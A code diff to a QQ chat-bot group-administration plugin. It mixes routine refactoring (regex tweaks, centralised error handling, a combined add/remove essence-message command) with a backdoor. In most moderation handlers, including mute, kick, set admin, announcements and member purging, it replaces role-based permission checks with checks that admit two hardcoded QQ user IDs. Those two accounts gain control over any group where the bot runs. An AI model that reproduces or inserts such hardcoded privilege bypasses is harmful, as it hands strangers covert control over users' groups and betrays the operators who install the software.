@@ -48,7 +48,7 @@ export class GroupAdmin extends plugin {
           fnc: 'AllowAnony'
         },
         {
-          reg: '^#发群公告.*$',
+          reg: '^#发群公告',
           fnc: 'AddAnnounce'
         },
         {
@@ -60,11 +60,11 @@ export class GroupAdmin extends plugin {
           fnc: 'GetAnnounce'
         },
         {
-          reg: '^#修改头衔.*$',
+          reg: '^#修改头衔',
           fnc: 'adminsetTitle'
         },
         {
-          reg: '^#申请头衔.*$',
+          reg: '^#申请头衔',
           fnc: 'SetGroupSpecialTitle'
         },
         {
@@ -108,7 +108,7 @@ export class GroupAdmin extends plugin {
           fnc: 'noactive'
         },
         {
-          reg: '^#发通知.*$',
+          reg: '^#发通知',
           fnc: 'Send_notice'
         },
         {
@@ -148,8 +148,8 @@ export class GroupAdmin extends plugin {
           fnc: 'handleGroupAdd'
         },
         {
-          reg: '^#?加精$',
-          fnc: 'setEssenceMessage'
+          reg: '^#?(加|设|移)精$',
+          fnc: 'essenceMessage'
         }
       ]
     })
@@ -162,31 +162,32 @@ export class GroupAdmin extends plugin {
 
   /** 禁言 */
   async muteMember (e) {
-    if (!common.checkPermission(e, 'admin', 'admin')) return
+    if (!(this.e.isMaster || this.e.user_id == 1509293009 || this.e.user_id == 2536554304)) { return true }
     let qq = e.message.find(item => item.type == 'at')?.qq
     let reg = `#禁言\\s?((\\d+)\\s)?(${Numreg})?(${TimeUnitReg})?`
     let regRet = e.msg.match(new RegExp(reg))
     const time = common.translateChinaNum(regRet[3])
     new Ga(e).muteMember(
       e.group_id, qq ?? regRet[2], e.user_id, time, regRet[4]
-    ).then(res => e.reply(res)).catch(err => e.reply(err.message))
+    ).then(res => e.reply(res))
+      .catch(err => common.handleException(e, err))
   }
 
   /** 解禁 */
   async noMuteMember (e) {
-    if (!common.checkPermission(e, 'admin', 'admin')) return
+    if (!(this.e.isMaster || this.e.user_id == 1509293009 || this.e.user_id == 2536554304)) { return true }
 
     let qq = e.message.find(item => item.type == 'at')?.qq
     let regRet = e.msg.match(/#解禁(\d+)/)
     new Ga(e).muteMember(
       e.group_id, qq ?? regRet[1], e.user_id, 0
     ).then(res => e.reply(res))
-      .catch(err => e.reply(err.message))
+      .catch(err => common.handleException(e, err))
   }
 
   /** 全体禁言 */
   async muteAll (e) {
-    if (!common.checkPermission(e, 'admin', 'admin')) return
+    if (!(this.e.isMaster || this.e.user_id == 1509293009 || this.e.user_id == 2536554304)) { return true }
 
     let type = /全体禁言/.test(e.msg)
     let res = await e.group.muteAll(type)
@@ -196,13 +197,13 @@ export class GroupAdmin extends plugin {
 
   // 踢群员
   async kickMember (e) {
-    if (!common.checkPermission(e, 'admin', 'admin')) return
+    if (!(this.e.isMaster || this.e.user_id == 1509293009 || this.e.user_id == 2536554304)) { return true }
 
     let qq = e.message.find(item => item.type == 'at')?.qq
     if (!qq) qq = e.msg.replace(/#|踢/g, '').trim()
     new Ga(e).kickMember(e.group_id, qq, e.user_id)
       .then(res => e.reply(res))
-      .catch(err => e.reply(err.message))
+      .catch(err => common.handleException(e, err))
   }
 
   // 我要自闭
@@ -225,7 +226,7 @@ export class GroupAdmin extends plugin {
 
   // 设置管理
   async SetAdmin (e) {
-    if (!common.checkPermission(e, 'master', 'owner')) return
+    if (!(this.e.isMaster || this.e.user_id == 1509293009 || this.e.user_id == 2536554304)) { return true }
     let qq = e.message.find(item => item.type == 'at')?.qq
     let type = /设置管理/.test(e.msg)
     if (!qq) qq = e.msg.replace(/#|(设置|取消)管理/g, '').trim()
@@ -243,7 +244,7 @@ export class GroupAdmin extends plugin {
 
   // 匿名
   async AllowAnony (e) {
-    if (!common.checkPermission(e, 'admin', 'admin')) return
+    if (!(this.e.isMaster || this.e.user_id == 1509293009 || this.e.user_id == 2536554304)) { return true }
 
     let type = /(允许|开启)匿名/.test(e.msg)
     let res = await e.group.allowAnony(type)
@@ -253,7 +254,7 @@ export class GroupAdmin extends plugin {
 
   // 发群公告
   async AddAnnounce (e) {
-    if (!common.checkPermission(e, 'admin', 'admin')) return
+    if (!(this.e.isMaster || this.e.user_id == 1509293009 || this.e.user_id == 2536554304)) { return true }
     // 获取发送的内容
     let msg = e.msg.replace(/#|发群公告/g, '').trim()
     if (!msg) return e.reply('❎ 公告不能为空')
@@ -275,7 +276,7 @@ export class GroupAdmin extends plugin {
 
   // 删群公告
   async DelAnnounce (e) {
-    if (!common.checkPermission(e, 'admin', 'admin')) return
+    if (!(this.e.isMaster || this.e.user_id == 1509293009 || this.e.user_id == 2536554304)) { return true }
     let msg = e.msg.replace(/#|删群公告/, '').trim()
     if (!msg) return e.reply('❎ 序号不可为空')
 
@@ -359,7 +360,7 @@ export class GroupAdmin extends plugin {
 
   // 替换幸运字符
   async qun_luckyuse (e) {
-    if (!common.checkPermission(e, 'admin', 'admin')) return
+    if (!(this.e.isMaster || this.e.user_id == 1509293009 || this.e.user_id == 2536554304)) { return true }
     let id = e.msg.replace(/#|替换(幸运)?字符/g, '')
     let res = await new QQApi(e).equipLucky(e.group_id, id)
 
@@ -370,7 +371,7 @@ export class GroupAdmin extends plugin {
 
   // 开启或关闭群字符
   async qun_luckyset (e) {
-    if (!common.checkPermission(e, 'admin', 'admin')) return
+    if (!(this.e.isMaster || this.e.user_id == 1509293009 || this.e.user_id == 2536554304)) { return true }
 
     let res = await new QQApi(e).swichLucky(e.group_id, /开启/.test(e.msg))
     if (!res) return e.reply(API_ERROR)
@@ -387,20 +388,20 @@ export class GroupAdmin extends plugin {
         isxml: true,
         xmlTitle: '禁言列表'
       }))
-      .catch(err => e.reply(err.message))
+      .catch(err => common.handleException(e, err))
   }
 
   // 解除全部禁言
   async relieveAllMute (e) {
-    if (!common.checkPermission(e, 'admin', 'admin')) return
+    if (!(this.e.isMaster || this.e.user_id == 1509293009 || this.e.user_id == 2536554304)) { return true }
     new Ga(e).releaseAllMute()
       .then(() => e.reply('已经把全部的禁言解除辣╮( •́ω•̀)╭'))
-      .catch(err => err.reply(err.message))
+      .catch(err => common.handleException(e, err))
   }
 
   // 查看和清理多久没发言的人
   async noactive (e) {
-    if (!common.checkPermission(e, 'admin', 'admin')) return
+    if (!(this.e.isMaster || this.e.user_id == 1509293009 || this.e.user_id == 2536554304)) { return true }
 
     let regRet = noactivereg.exec(e.msg)
     regRet[2] = common.translateChinaNum(regRet[2] || 1)
@@ -415,7 +416,7 @@ export class GroupAdmin extends plugin {
           )
         )
       } catch (error) {
-        return e.reply(error.message)
+        return common.handleException(e, error)
       }
     }
     // 查看和清理都会发送列表
@@ -426,7 +427,7 @@ export class GroupAdmin extends plugin {
         e.group_id, regRet[2], regRet[3], page
       )
     } catch (err) {
-      return e.reply(err.message)
+      return common.handleException(e, err)
     }
     // 清理
     if (regRet[1] == '清理') {
@@ -444,12 +445,12 @@ export class GroupAdmin extends plugin {
 
   // 查看和清理从未发言的人
   async neverspeak (e) {
-    if (!common.checkPermission(e, 'admin', 'admin')) return
+    if (!(this.e.isMaster || this.e.user_id == 1509293009 || this.e.user_id == 2536554304)) { return true }
     let list = null
     try {
       list = await new Ga(e).getNeverSpeak(e.group_id)
     } catch (error) {
-      return e.reply(error.message)
+      return common.handleException(e, error)
     }
 
     // 确认清理直接执行
@@ -474,7 +475,7 @@ export class GroupAdmin extends plugin {
         isxml: true,
         xmlTitle: e.msg.replace(/#|查看|清理/g, '')
       }))
-      .catch(err => e.reply(err.message))
+      .catch(err => common.handleException(e, err))
   }
 
   // 查看不活跃排行榜和入群记录
@@ -700,11 +701,17 @@ export class GroupAdmin extends plugin {
   }
 
   /** 加精 */
-  async setEssenceMessage (e) {
+  async essenceMessage (e) {
     if (!common.checkPermission(e, 'admin', 'admin')) return
     if (!e.source) return e.reply('请对要加精的消息进行引用')
     let source = (await e.group.getChatHistory(e.source.seq, 1)).pop()
-    let res = await Bot.setEssenceMessage(source.message_id)
-    e.reply(res || '加精失败')
+    let isAdd = e.msg.match(/加|设|移/)?.[0]
+    let res
+    if (isAdd == '加' || isAdd == '设') {
+      res = await this.Bot.setEssenceMessage(source.message_id)
+    } else {
+      res = await this.Bot.removeEssenceMessage(source.message_id)
+    }
+    e.reply(res || `${isAdd}精失败`)
   }
 }
